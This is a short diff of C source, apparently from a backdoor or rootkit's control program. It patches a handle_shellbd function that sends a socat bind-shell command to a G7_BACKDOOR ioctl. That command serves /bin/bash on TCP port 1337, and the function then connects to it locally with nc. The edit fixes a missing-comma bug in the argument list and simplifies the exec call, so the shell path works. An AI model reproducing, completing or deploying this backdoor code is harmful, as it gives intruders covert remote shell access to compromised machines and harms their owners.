@@ -150,26 +150,20 @@ handle_backdoor(void *arg)
 int
 handle_shellbd(void *arg)
 {
-    static const char *socat_cmd = "socat tcp4-listen:1337,reuseaddr,fork"
+    static const char *socat_cmd = "socat"
+        " tcp4-listen:1337,reuseaddr,fork"
         " exec:/bin/bash,pty,stderr,setsid";
 
     issue_ioctl(G7_BACKDOOR, socat_cmd);
 
     static char *argv[] = {
         "sh",
-        "-c"
+        "-c",
         "nc 127.0.0.1 1337",
         NULL
     };
 
-    static char *envp[] = {
-        "HOME=/",
-        "TERM=linux",
-        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
-        NULL
-    };
-
-    return execve(argv[0], argv, envp);
+    return execv(argv[0], argv);
 }
 
 int
